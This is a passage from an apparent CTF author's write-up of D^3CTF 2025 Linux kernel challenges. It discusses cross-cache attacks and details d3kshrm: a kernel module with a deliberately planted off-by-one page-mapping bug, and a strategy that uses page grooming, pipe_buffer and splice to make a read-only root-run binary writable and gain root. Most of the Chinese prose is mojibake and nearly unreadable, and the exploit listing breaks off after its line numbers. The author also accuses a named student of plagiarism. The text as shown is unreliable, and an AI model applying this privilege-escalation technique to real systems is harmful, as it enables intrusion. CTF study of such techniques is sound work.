å¹´å¹¶ä¸æ˜¯ä¸€ä¸ªéå¸¸æ–°çš„äº‹ç‰©ï¼ˆç”šè‡³åœ¨ 2022 å¹´å°±å·²ç» <a href="https://i.blackhat.com/USA-22/Thursday/US-22-WANG-Ret2page-The-Art-of-Exploiting-Use-After-Free-Vulnerabilities-in-the-Dedicated-Cache.pdf">æœ‰äººæå‡º</a>ï¼Œè™½ç„¶ç¬”è€…ä¸çŸ¥é“è¿™æ˜¯ä¸æ˜¯æœ€æ—©çš„ï¼‰ï¼Œä½†åœ¨è¿‡å»å‡ å¹´çš„ CTF å½“ä¸­ cross-cache attack å¹¶ä¸å¸¸è§ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘é€‰æ‹©åœ¨ä»Šå¹´çš„ D^3CTF å½“ä¸­å±•ç¤ºè¿™ä¸ªæŠ€æœ¯ï¼Œå› ä¸ºåœ¨ 2024 å¹´æˆ‘æ¯”è¾ƒå¿™ï¼Œè€Œåœ¨ 2023 å¹´æˆ‘åˆå±•ç¤ºäº†ä¸€äº› <a href="https://github.com/arttnba3/D3CTF2023_d3kcache">åˆ«çš„ä¸œè¥¿</a> ï¼ˆåœ¨ä¸€å¹´åè¢«ä¸€ä¸ªåä¸º <a href="https://github.com/Lotuhu">èƒ¡å˜‰æ‡¿</a> çš„å‚åŠ è¿‡ D^3CTF 2023 çš„å­¦ç”Ÿ <strong>æŠ„è¢­</strong> å¹¶ <strong>å·å»å‘äº†</strong> <a href="https://i.blackhat.com/BH-US-24/Presentations/US24-Qian-PageJack-A-Powerful-Exploit-Technique-With-Page-Level-UAF-Thursday.pdf">BlackHat USA 2024</a> ï¼Œæ•¢åœ¨ BlackHat ä¸Šç›´æ¥å±•ç¤ºä¸€ä¸ªå’ŒğŸ‘´åšå®¢å‡ ä¹ä¸€æ¨¡ä¸€æ ·çš„ä¸œè¥¿ç¡®å®è¿˜çœŸæ˜¯ <strong>æŒºä¸è¦è„¸çš„</strong> ï¼‰</p><p>å¦ä¸€ä¸ªæˆ‘é€‰æ‹© cross-cache attack çš„åŸå› æ˜¯ <em>æˆ‘ç¡®å®æ²¡æœ‰å¤ªå¤šæ—¶é—´æ¥å®Œæˆè¿™äº›é¢˜ç›®</em> ï¼Œç”±äºæˆ‘å·²ç»ä»æœ¬ç§‘æ¯•ä¸šäº†ï¼Œæˆ‘å¹¶æ²¡æœ‰å¤ªå…³æ³¨äºæˆ‘çš„åè¾ˆä»¬ä»Šå¹´å‡†å¤‡ D^3CTF çš„æƒ…å†µï¼Œç›´åˆ° <strong>æ¯”èµ›å¼€å§‹çš„å¤§æ¦‚ 10 å¤©å‰</strong> æ‰çŸ¥é“ä»Šå¹´å‡ ä¹è¿˜æ²¡æœ‰ pwn é¢˜ï¼Œå› æ­¤æˆ‘ä¸å¾—ä¸åœ¨è„‘å­é‡Œå‡ ä¹æ²¡æœ‰ä»€ä¹ˆæ–°çš„ç ”ç©¶æˆæœçš„æƒ…å†µä¸‹å†²åˆºå‡†å¤‡ä»Šå¹´çš„ Pwn é¢˜ä»¥ç¡®ä¿æ¯”èµ›èƒ½åƒå¾€å¹´ä¸€æ ·æ­£å¸¸ä¸¾åŠï¼Œ <strong>éå¸¸æŠ±æ­‰ä»Šå¹´ç¬”è€…æœªèƒ½å¸¦æ¥å’Œ 2023 å¹´çš„ d3kcache ä¸€æ ·ç‚«é…·çš„ç©æ„</strong> ï¼Œä½†å¹¸è¿çš„æ˜¯æˆ‘ä»ç„¶ç»™ä½ ä»¬å‡†å¤‡äº†ä¸€äº›ç‰¹æ®Šçš„ç¤¼ç‰©ï¼Œé‚£å°±æ˜¯æˆ‘ç©å¼„ <code>msg_msg</code> ä¸ <code>pipe_buffer</code> çš„å°æŠ€å·§ï¼š <em>tricky but useful gadgets you may be love in</em></p><p>ä»¥åŠå¦‚æœä½ è¶³å¤Ÿç»†å¿ƒä½ æˆ–è®¸ä¼šå‘ç°è¿™é“é¢˜æ²¡æœ‰åƒ <a href="https://github.com/arttnba3/D3CTF2025_d3kshrm">d3kshrm</a> é‚£æ ·å¼€å¯ <code>CONFIG_SLAB_BUCKETS</code> é…ç½®ï¼ˆä¸€ç§å¯¹æŠ—å †å–·çš„ç¼“è§£æªæ–½ï¼‰ï¼Œè™½ç„¶é€šè¿‡å…¨é‡å †å–·æ¥ä»£æ›¿ç²¾ç¡®å¯¹è±¡åˆ†é…ä»¥ç»•è¿‡å¹¶ä¸éš¾ï¼Œä½†è€ƒè™‘åˆ°ä»Šå¹´çš„ D^3CTF åªæœ‰ 24hï¼Œæˆ‘è¿˜æ˜¯å¸Œæœ›è¿™é“é¢˜èƒ½å¤Ÿè®©é€‰æ‰‹ä»¬åœ¨ â€œPwnâ€ è¿™ä¸€åˆ†ç±»æ¯”è¾ƒç®€å•åœ°èƒ½ç­¾ä¸Šåˆ°ï¼Œå°±åƒ D^3CTF 2022 çš„ <code>d3kheap</code> çš„ä»‹ç»ä¸€æ ·ï¼Œå› æ­¤è¿™é“é¢˜åœ¨æœ€åˆè®¾è®¡æ—¶å¹¶ä¸æ˜¯ä¸€é“éå¸¸éš¾é¢˜ç›®</p><p>å¯¹äºæœ€åçš„è§£é¢˜ç»“æœï¼Œç»å¤§éƒ¨åˆ†é€‰æ‰‹éƒ½ä½¿ç”¨äº†é¢„æœŸçš„ cross-cache attackï¼Œç¬”è€…éå¸¸å¼€å¿ƒèƒ½å¤Ÿçœ‹åˆ°å‚ä¸æ¯”èµ›çš„ CTFer ä»¬å¤§éƒ½å·²ç»æŒæ¡äº†è¿™é¡¹èƒ½å¤Ÿåœ¨è¿‘ä¹ä»»æ„å †æ¼æ´ä¸Šè¿›è¡Œåˆ©ç”¨çš„é«˜çº§æŠ€æœ¯ï¼Œè€Œéšç€ cross-cache attack åœ¨è¿‘å¹´å·²ç»è¢«å¹¿æ³›ä½¿ç”¨ï¼Œæˆ‘ç¡®ä¿¡è¿™å°†ã€æˆ–å·²ç»æˆä¸ºäº†å¦‚ä»Š Linux kernel exploitation çš„åŸºç¡€æ­¥éª¤æˆ–æ˜¯æ ‡å‡†å…¥å£ï¼›éå¸¸é—æ†¾çš„æ˜¯æˆ‘ <strong>å¿˜äº†</strong> å¼€å¯ <code>CONFIG_MEMCG</code> ä»¥åˆ†å¼€ <code>GFP_KERNEL</code> å’Œ <code>GFP_KERNEL_ACCOUNT</code> å¯¹è±¡ï¼Œä½ ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä½¿ç”¨äº†éå¸¸å¤æ‚çš„å¤šé˜¶æ®µåˆ©ç”¨æŠ€æœ¯æ“çºµ <code>msg_msg</code> ä¸ <code>pipe_buffer</code> ï¼Œä½†æœ‰çš„é€‰æ‰‹å°±å¯ä»¥ç›´æ¥ç”¨ <code>sk_buff</code> æ¥è¯»å†™ UAF çš„ <code>pipe_buffer</code> ï¼›å¦ä¸€ä¸ªé—æ†¾çš„æ˜¯å–å¾—ä¸€è¡€çš„ <a href="https://w0y.at/">We_0wn_y0u</a> æˆ˜é˜Ÿåœ¨ D^3CTF 2025 å½“ä¸­ä»…åšäº† d3kheap2 è¿™ä¸€é“é¢˜ç›®å°±èµ°äº†ï¼Œå› æ­¤æˆ‘å¹¶ä¸çŸ¥é“ä»–ä»¬çš„å…·ä½“è§£æ³•</p><p>ç°åœ¨è®©æˆ‘ä»¬æ¥çœ‹çœ‹é‚£äº› <strong>æœ€å…ˆè¿›çš„å­¦æœ¯æŠ€æœ¯</strong> å¦‚ Dirty PageTableï¼ˆ <a href="https://www.usenix.org/conference/usenixsecurity24/presentation/maar-slubstick">SLUBStick</a> ï¼Œ<em>æˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆæœ‰ä¸¤ä¸ªåå­—ï¼Œæˆ‘ä¹Ÿä¸ç¡®å®šä»–ä»¬çš„ä½œè€…æ˜¯å¦ç›¸åŒ</em> ï¼Œå› ä¸º Dirty Pagetable çš„åŸåšå®¢ä¼¼ä¹è¢«ç§»é™¤äº†ï¼Œæˆ‘æš‚æ—¶ä¹Ÿæ²¡æœ‰è¶³å¤Ÿçš„æ—¶é—´å»åšåŒºåˆ†ï¼‰ä¸ <a href="https://www.usenix.org/conference/usenixsecurity24/presentation/guo-ziyi">DirtyPage</a> ï¼ˆä½œè€…ä¹Ÿå«ä»– Page Sprayï¼‰ï¼Œ <strong>å…¶åŸºç¡€æŠ€æœ¯éƒ½æ˜¯ cross-cache attack</strong> ï¼šä»–ä»¬æ˜¯å¦å¼ºå¤§åˆ°è¶³ä»¥åº”ç”¨åœ¨è¿™é“é¢˜ç›®ä¸Šï¼Ÿç»“æœä¼¼ä¹æ˜¯ <strong>æ²¡é‚£ä¹ˆå®¹æ˜“</strong> ï¼Œå› ä¸ºä»–ä»¬éƒ½æ˜¯ä¸ºä¸åŒçš„æ¼æ´èŒƒå¼è€Œè®¾è®¡çš„</p><ul><li>å¯¹äº SLUBStick è€Œè¨€ï¼Œæˆ‘ä»¬éœ€è¦é¢å¤–çš„å‡ æ¬¡è¿›è¡Œ <strong>UAF å†™</strong> çš„æƒèƒ½ï¼Œè¿™ä¼šéœ€è¦æˆ‘ä»¬æ„é€ å¤æ‚çš„å¤šé˜¶æ®µçš„ cross-cache é¡µé‡Šæ”¾ä¸é‡å–å›ï¼Œåœ¨æå‡äº†æ„é€ åˆ©ç”¨çš„éš¾åº¦çš„åŒæ—¶ä¹Ÿé™ä½äº†å¯ç”¨æ€§ä¸ç¨³å®šæ€§</li><li>DirtyPage è¯´å…¶é€šè¿‡è¿·æƒ‘åœ¨ä¸€ä¸ª SLUB ä¸Šçš„å¯¹è±¡è®¡æ•°ï¼ˆå‚è§ <code>Figure 1: Page Spray Exploit Model for Double Free.</code> ï¼‰â€œèµ°äº†æ›´è¿œçš„ä¸€æ­¥â€ ï¼Œä½†è¦†å†™ä¸€ä¸ªæ²¡æœ‰ä»»ä½•åŠŸèƒ½çš„å¯¹è±¡æ˜¯ <strong>æ¯«æ— æ„ä¹‰çš„</strong> ï¼Œåœ¨ç¬”è€…çœ‹æ¥è¿™æˆ–è®¸æ›´é€‚ç”¨äºæ”»å‡»æœ‰ç€ç‰¹å®šåŠŸèƒ½çš„å†…æ ¸å¯¹è±¡ï¼ˆä¾‹å¦‚ <code>file</code> æˆ–æ˜¯ <code>pipe_buffer</code> ï¼Ÿï¼‰ï¼Œä½†è‹¥æ˜¯ç›®æ ‡å¯¹è±¡ç¼ºå°‘ä¸ºåç»­æ”»å‡»é˜¶æ®µçš„è¶³å¤Ÿçš„ä¾›èƒ½ï¼Œè¿™æ ·çš„åˆ©ç”¨æˆ–è®¸æ— æ³•è¢«åº”ç”¨</li></ul><p>å› æ­¤ï¼Œ <strong>çº¯ç²¹çš„ cross-cache attack åœ¨æˆ‘çœ‹æ¥æ›´é€‚ç”¨äº d3kheap2</strong> ï¼Œä½†æ— è®ºå¦‚ä½•æ„Ÿè°¢ä»–ä»¬å¼€å‘äº†å¦‚æ­¤å¼ºå¤§çš„åˆ©ç”¨æŠ€æœ¯å¹¶æ‹“å®½äº†æˆ‘ä»¬çš„è§†é‡åˆ°å¦ä¸€ä¸ªå±‚é¢</p><p>å¦ä¸€ä¸ªç‚¹ä¾¿æ˜¯å¦‚åŒ Pspray è¿™æ ·çš„é€šè¿‡è®¡æ—¶ä¾§ä¿¡é“æ”»å‡»æ¥é¢„æµ‹åˆ†é… SLUB é¡µé¢çš„è¾…åŠ©æŠ€æœ¯å¯¹äºä¸å±€é™äº <code>d3kheap2</code> çš„é€šç”¨å†…æ ¸å †åˆ©ç”¨è€Œè¨€ä¼¼ä¹æ²¡æœ‰å¤ªå¤šä½œç”¨ï¼Œä¸€ä¸ªæ ¸å¿ƒçš„åŸå› ä¾¿æ˜¯éšç€åƒ <code>CONFIG_RANDOM_KMALLOC_CACHES</code> è¿™æ ·çš„ç¼“è§£æªæ–½çš„å‡ºç°åœ¨å†…æ ¸ä¸»çº¿ä½¿å¾—ä¸€ä¸ªæ–°çš„ SLUB page æ˜¯å¦è¢«åˆ†é…å¯¹äºæˆ‘ä»¬è€Œè¨€ä¸å†é‚£ä¹ˆé‡è¦ï¼Œå› ä¸ºæˆ‘ä»¬çš„å¯¹è±¡æ€»ä¼šä»ä¸åŒçš„ç‹¬ç«‹çš„æ± ä¸­éšæœºåˆ†é…ï¼Œè¿›è¡Œå¤§é‡çš„å †å–·å¹¶è¿›è¡Œè¿‘ä¼¼ä¼°è®¡ä¼¼ä¹æ˜¯å”¯ä¸€çš„å¯è¡Œæ–¹æ³•ï¼Œå°½ç®¡åœ¨ <code>d3kheap2</code> æ²¡æœ‰å¼€å¯è¿™ä¸€ç¼“è§£æªæ–½ï¼Œç¬”è€…ä»ç„¶æƒ³è®²ä¸€è®²ä¸çœŸå®ä¸–ç•Œåˆ©ç”¨æœ‰å…³çš„ä¸œè¥¿ï¼Œå¸Œæœ›å¤§å®¶ä¸è¦ä»‹æ„ï¼šï¼‰</p><p>å°½ç®¡å…³äº Linux kernel exploitation ç¬”è€…è¿˜æœ‰å¾ˆå¤šæƒ³è¯´çš„è¯ï¼Œä½†ä¼¼ä¹å†™åˆ°è¿™é‡Œçš„æ—¶å€™æ–‡ç« å·²ç»å¤ªé•¿äº†ï¼Œé‚£ä¹ˆå°±è®©æˆ‘ä»¬å°±æ­¤æ‰“ä½å§ï¼Œæ— è®ºå¦‚ä½•æˆ‘è¦æ„Ÿè°¢æ¯ä¸€ä½å‚åŠ äº†è¿™ä¸ª CTF å¹¶å°è¯•è¿›è¡Œè§£é¢˜çš„é€‰æ‰‹ï¼Œæ— è®ºä½ ä»¬æ˜¯å¦è·å¾—äº† flag</p><h1 id="0x02-D3KSHRM-1-Solve"><a href="#0x02-D3KSHRM-1-Solve" class="headerlink" title="0x02. D3KSHRM | 1 Solve"></a>0x02. D3KSHRM | 1 Solve</h1><p>You know what? Sharing is always a good moral quality. Thatâ€™s the reason why Iâ€™m going to share some of my precious memories with all of you!</p><blockquote><p>Copyright(c) 2025 &lt;ãƒ‡ã‚£ãƒ¼ã‚­ãƒ¥ãƒ¼ãƒ–ãƒ»ã‚·ãƒ¼ãƒ†ã‚£ãƒ¼ã‚¨ãƒ• ã‚«ãƒ¼ãƒãƒ« Pwn è£½ä½œå§”å“¡ä¼š&gt;</p><p>Author: arttnba3 @ L-team x El3ctronic x D^3CTF</p><p>You can get the original attachment at <a href="https://github.com/arttnba3/D3CTF2025_d3kshrm">https://github.com/arttnba3/D3CTF2025_d3kshrm</a>.</p></blockquote><h2 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h2><p>è¿™é“é¢˜ç›®æä¾›äº†ä¸€ä¸ªåä¸º <code>d3kshrm.ko</code> çš„å†…æ ¸æ¨¡å—ï¼Œå…¶ä¸ºç”¨æˆ·æä¾›äº†åˆ›å»ºå…±äº«å†…å­˜çš„åŠŸèƒ½ï¼Œé€šè¿‡ <code>ioctl()</code> æˆ‘ä»¬æœ‰ç€å¦‚ä¸‹æƒèƒ½ï¼š</p><ul><li>åˆ›å»ºä¸€ä¸ªç‰¹å®šå¤§å°çš„æ–°çš„å…±äº«å†…å­˜</li><li>ç»‘å®šåˆ°ä¸€ä¸ªç°æœ‰çš„å…±äº«å†…å­˜ä¸Š</li><li>ä¸å½“å‰å…±äº«å†…å­˜è§£ç»‘</li><li>åˆ é™¤ä¸€ä¸ªç°æœ‰çš„å…±äº«å†…å­˜</li></ul><p>è€Œè¦è®¿é—®è¿™å—å†…å­˜ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç»‘å®šä¹‹åå» <code>mmap()</code> å¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œè€Œè¿™ä¹Ÿæ˜¯æ¼æ´æ‰€åœ¨çš„åœ°æ–¹ï¼Œç”±äºç¼ºä¹å¯¹ <code>d3kshrm::pages</code> çš„æ°å½“çš„èŒƒå›´æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥å°† <code>d3kshrm::pages</code> çš„ç›¸é‚»çš„ 8 å­—èŠ‚ä½œä¸ºä¸€ä¸ª <code>struct page</code> æŒ‡é’ˆå¹¶æ˜ å°„åˆ°ç”¨æˆ·åœ°å€ç©ºé—´ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">vm_fault_t</span> <span class="hljs-title function_">d3kshrm_vm_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_fault *vmf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">d3kshrm_struct</span> *<span class="hljs-title">d3kshrm</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>;</span><br>    <span class="hljs-type">vm_fault_t</span> res;<br><br>    vma = vmf-&gt;vma;<br>    d3kshrm = (<span class="hljs-keyword">struct</span> d3kshrm_struct *) vma-&gt;vm_private_data;<br><br>    spin_lock(&amp;d3kshrm-&gt;lock);<br><br>    <span class="hljs-comment">/* vulnerability here */</span><br>    <span class="hljs-comment">// if (vmf-&gt;pgoff &gt;= d3kshrm-&gt;page_nr) &#123;</span><br>    <span class="hljs-keyword">if</span> (vmf-&gt;pgoff &gt; d3kshrm-&gt;page_nr) &#123;<br>        res = VM_FAULT_SIGBUS;<br>        <span class="hljs-keyword">goto</span> ret;<br>    &#125;<br><br>    get_page(d3kshrm-&gt;pages[vmf-&gt;pgoff]);<br>    vmf-&gt;page = d3kshrm-&gt;pages[vmf-&gt;pgoff];<br>    res = <span class="hljs-number">0</span>;<br><br>ret:<br>    spin_unlock(&amp;d3kshrm-&gt;lock);<br><br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Exploitation-1"><a href="#Exploitation-1" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>ç”±äº <code>d3kshrm::pages</code> ä¼šä»ç‹¬ç«‹çš„ <code>kmem_cache</code> ä¸­è¿›è¡Œåˆ†é…ï¼Œæˆ‘ä»¬å¿…é¡»ä½¿ç”¨é¡µçº§å †é£ï¼Œæ°´æŠ€æœ¯æ¥æ“çºµé¡µçº§å†…å­˜ä»¥å°è¯•å»æ˜ å°„é¢˜ç›®åŠŸèƒ½ä»¥å¤–çš„é¡µæŒ‡é’ˆï¼Œå› ä¸ºç”±äºå¼•ç”¨è®¡æ•°çš„å­˜åœ¨æˆ‘ä»¬æ— æ³•é€šè¿‡ç›´æ¥æ˜ å°„ä¸€ä¸ªé¡µé¢ä¸¤æ¬¡çš„æ–¹å¼æ¥ç›´æ¥è¿›è¡Œé¡µçº§çš„åŒé‡é‡Šæ”¾ï¼Œå› æ­¤æˆ‘ä»¬å¯ç”¨çš„åˆ©ç”¨ç­–ç•¥æ˜¯å°†åŸæœ¬åªæœ‰åªè¯»æƒé™çš„é¡µé¢æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ï¼Œè¿™ä¸ç¦è®©æˆ‘ä»¬æƒ³èµ· <a href="https://github.com/arttnba3/Linux-kernel-exploitation/tree/main/CVE/CVE-2023-2008">CVE-2023-2008</a> ï¼Œå…¶åŒæ ·ä¹Ÿæ˜¯åˆ©ç”¨äº†è¶Šç•Œé¡µæ˜ å°„æ¥å®Œæˆç±»ä¼¼ Dirty Pipe çš„æ”»å‡»ï¼Œå› æ­¤ä¸‹é¢æ˜¯æˆ‘ä»¬çš„åˆ©ç”¨ç­–ç•¥ï¼š</p><ul><li>ä½¿ç”¨é¡µçº§å †é£æ°´æŠ€æœ¯é‡æ’å¸ƒé¡µçº§å†…å­˜ä»¥è®©é¢˜ç›®çš„ç‹¬ç«‹ <code>kmem_cache</code> çš„ SLUB page è¢«æ”¾åˆ°ç›®æ ‡å¯¹è±¡çš„ä¸¤å¼  SLUB page ä¸­é—´ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹© <code>pipe_buffer</code> ä½œä¸ºæˆ‘ä»¬çš„ç›®æ ‡å¯¹è±¡ï¼Œå› ä¸ºå…¶ç»“æ„ä½“å¼€å¤´æœ‰ä¸€ä¸ª <code>struct page</code> æŒ‡é’ˆï¼Œè¿™è®©æˆ‘ä»¬èƒ½å¤Ÿè¿›è¡Œ oob mapping</li><li>æ‰“å¼€ä¸€ä¸ªåªè¯»æ–‡ä»¶å¹¶ä½¿ç”¨ <code>spice()</code> ç³»ç»Ÿè°ƒç”¨æ¥å°†å…¶ç¬¬ä¸€ä¸ªé¡µé¢æ”¾åˆ° <code>pipe_buffer</code> å½“ä¸­</li><li>åˆ©ç”¨æ¼æ´æ¥è¿›è¡Œ oob mapping ä»¥å°†åªæœ‰åªè¯»æƒé™çš„é¡µä»¥å¯è¯»å†™æƒé™æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´å½“ä¸­ï¼Œç”±æ­¤æˆ‘ä»¬ä¾¿èƒ½ä¿®æ”¹åªè¯»æ–‡ä»¶</li></ul><p>æˆ‘æœ€ç»ˆé€‰æ‹© <code>/sbin/poweroff</code> ï¼ˆå…¶é“¾æ¥åˆ° <code>busybox</code> ä¸Šï¼‰ä½œä¸ºæˆ‘ä»¬çš„ç›®æ ‡æ–‡ä»¶ï¼Œå› ä¸º <code>/etc/init.d/rcS</code> çš„æœ€åä¸€è¡Œæ˜¯ä»¥ root æƒé™æ‰§è¡Œ <code>/sbin/poweroff</code> ï¼Œè¿™è®©æˆ‘ä»¬èƒ½å¤Ÿä»¥ root æƒé™æ‰§è¡Œä»»æ„ä»£ç ï¼Œæœ€ç»ˆçš„åˆ©ç”¨ç¨‹åºå¦‚ä¸‹ï¼Œæœ‰ç€å°†è¿‘ <code>84.63%</code> çš„æˆåŠŸç‡ï¼ˆåœ¨ç»è¿‡è¶…è¿‡ 2048 æ¬¡çš„æœ¬åœ°è‡ªåŠ¨æµ‹è¯•å¾—å‡ºçš„ç»“æœï¼‰ï¼Œä¸”æˆ‘ç¡®ä¿¡è¿˜æœ‰èƒ½å°†å…¶ä¼˜åŒ–åˆ° <code>95%+</code> çš„ç©ºé—´ï¼Œå› ä¸ºæˆ‘å¹¶æ²¡æœ‰é‡‡ç”¨æ›´åŠ å¤æ‚çš„é«˜çº§é¡µé£æ°´æŠ€å·§ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span 